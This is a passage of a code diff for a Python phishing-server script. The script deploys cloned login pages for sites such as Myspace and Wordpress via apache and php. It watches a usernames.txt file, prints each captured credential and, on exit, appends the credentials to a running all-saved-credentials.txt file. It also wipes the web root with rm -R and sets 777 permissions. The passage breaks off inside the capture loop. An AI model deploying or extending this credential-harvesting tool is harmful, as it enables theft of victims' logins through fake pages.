@@ -45,45 +45,39 @@ print("[10] Myspace             [20] Wordpress")
 web_num = input("\nPlease enter a number: ")
 website = sites[web_num]
 
+# Copy site resources into the apache2 root directory
 print("\nSetting up DocumentRoot for apache...")
-os.system("sed -i 's!/phish/sites/.*\"!/phish/sites/{}\"!g' /etc/apache2/httpd.conf".format(website))
-os.system("sed -i 's!/var/www/localhost/htdocs!/phish/sites/{}!g' /etc/apache2/httpd.conf".format(website))
+os.system("rm -R /var/www/html/*")
+os.system("cp -R /phish-server/aws/sites/{}/* /var/www/html/".format(website))
+time.sleep(1)
 
+# Start the php server
 print("Starting php server...")
-os.system("chmod 777 /phish/sites/{}".format(website))  # Add permissions for the php files to read and write
-os.system("cd /phish/sites/{}/ && php -S 127.0.0.1:80 > /dev/null 2&>1 & sleep 2".format(website))
+os.system("sudo chmod 777 /phish-server/sites/{}".format(website))  # Add permissions for the php files to read and write
+os.system("cd /phish-server/aws/sites/{}/ && sudo php -S 127.0.0.1:3333 > /dev/null 2&>1 & sleep 2".format(website))
 
+# Start the web server
 print("Starting web server...\n")
-# already_running = False
-# for proc in psutil.process_iter():
-#     try:
-#         if 'httpd'.lower() in proc.name().lower():
-#             # If httpd is already running, we need to restart it
-#             already_running = True
-#             print("httpd already running, now restarting")
-#             os.system("rc-service apache2 restart")
-#             pass
-#     except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-#         pass
-
-# If httpd not already running, start it
-#if already_running == False:
 os.system("httpd 2> /dev/null")
 time.sleep(2)
 
-print("Open 'localhost:3333' on your local machine.\n")
-
 # Signal handler for CTRL+C
 def handler(signal_received, frame):
-    print("\nCaptured credentials stored in /phish/sites/{}/usernames.txt".format(website))
-    exit(0)
+    if os.path.exists("/var/www/html/usernames.txt"):
+        os.system("echo {} >> /phish-server/aws/all-saved-credentials.txt".format(website))
+        os.system("cat /var/www/html/usernames.txt >> /phish-server/aws/all-saved-credentials.txt")
+        os.system("echo '' >> /phish-server/aws/all-saved-credentials.txt")
+    exit(0);
 
+# Add handler for CTRL+C
 signal(SIGINT, handler)
+
+# Loop that prints any newly captured credentials
 print("Waiting for credentials...")
 count = 0
 while 1:
-    if os.path.exists("/phish/sites/{}/usernames.txt".format(website)):
-        creds = open("/phish/sites/{}/usernames.txt".format(website)).read().split("\n")
+    if os.path.exists("/var/www/html/usernames.txt"):
+        creds = open("/var/www/html/usernames.txt").read().split("\n")
         if (count < len(creds)):
             if creds[count - 1] != "":
                 print("New credentials captured: " + creds[count - 1])
